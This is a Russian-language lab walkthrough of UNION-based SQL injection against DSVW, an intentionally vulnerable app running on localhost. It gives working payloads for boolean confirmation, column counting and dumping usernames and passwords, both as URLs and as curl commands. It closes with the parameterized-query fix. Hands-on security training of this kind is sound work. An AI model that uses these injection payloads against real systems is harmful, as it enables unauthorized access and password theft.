# Задание 1 — SQL-инъекция в DSVW (UNION-based)

Разбор на **твоём** стенде DSVW (`http://127.0.0.1:65412`). Только localhost, только
своё устройство.

## Что внутри

DSVW строит запрос конкатенацией, без параметров:

```python
cursor.execute("SELECT id, username, name, surname FROM users WHERE id=" + params["id"])
```

Таблица: `users(id, username, name, surname, password)`. Значение `id`
подставляется **без кавычек**, значит инъекция **числовая** — ломать строку
кавычкой `'` не нужно. Пароль в SELECT не входит — вытащим его через `UNION`.

## Шаг 1. Базовый запрос

```
http://127.0.0.1:65412/?id=1
```
Вернётся строка пользователя с `id=1` (admin). Это «нормальное» поведение.

## Шаг 2. Подтверждаем инъекцию (булева логика)

```
http://127.0.0.1:65412/?id=1 AND 1=1     → строка есть  (истина)
http://127.0.0.1:65412/?id=1 AND 1=2     → строки нет   (ложь)
```
Ответ меняется от логического условия → ввод исполняется как SQL. Кавычка не
понадобилась, потому что `id` числовой.

## Шаг 3. Считаем колонки

```
http://127.0.0.1:65412/?id=1 ORDER BY 4  → ок
http://127.0.0.1:65412/?id=1 ORDER BY 5  → ошибка
```
Значит в выборке **4** колонки (id, username, name, surname).

## Шаг 4. Вытаскиваем пароли через UNION

Берём несуществующий id (`-1`), чтобы осталась только наша строка, и кладём
`password` в отображаемые колонки (name/surname):

```
http://127.0.0.1:65412/?id=-1 UNION SELECT id, username, password, password FROM users
```
Получишь список: `username` и его `password` (admin / 7en8aiDoh! и т.д.).

## Через curl (вторая сессия Termux)

curl сам закодирует пробелы, если параметр передать так:

```bash
# подтверждение инъекции
curl -G "http://127.0.0.1:65412/" --data-urlencode "id=1 AND 1=2"

# дамп логинов и паролей
curl -G "http://127.0.0.1:65412/" \
     --data-urlencode "id=-1 UNION SELECT id, username, password, password FROM users"
```

## Как это чинится (сторона разработчика)

Параметризованный запрос вместо конкатенации:

```python
cursor.execute("SELECT id, username, name, surname FROM users WHERE id=?", (params["id"],))
```
Плюс — минимальные привилегии БД и валидация типа (`id` должен быть числом).

## Где здесь твоё приложение

Аудитор в приложении — **пассивный**: он не отправляет инъекции, поэтому SQLi он
не найдёт (и это правильно — так его безопасно запускать по реальным сайтам). По
DSVW он покажет другое: отсутствие security-заголовков и небезопасную cookie.
Активная эксплуатация (этот разбор) — задача стенда, а не раздаваемого APK. Это и
есть граница: пассивная оценка в приложении, наступательная практика — на своей
мишени.
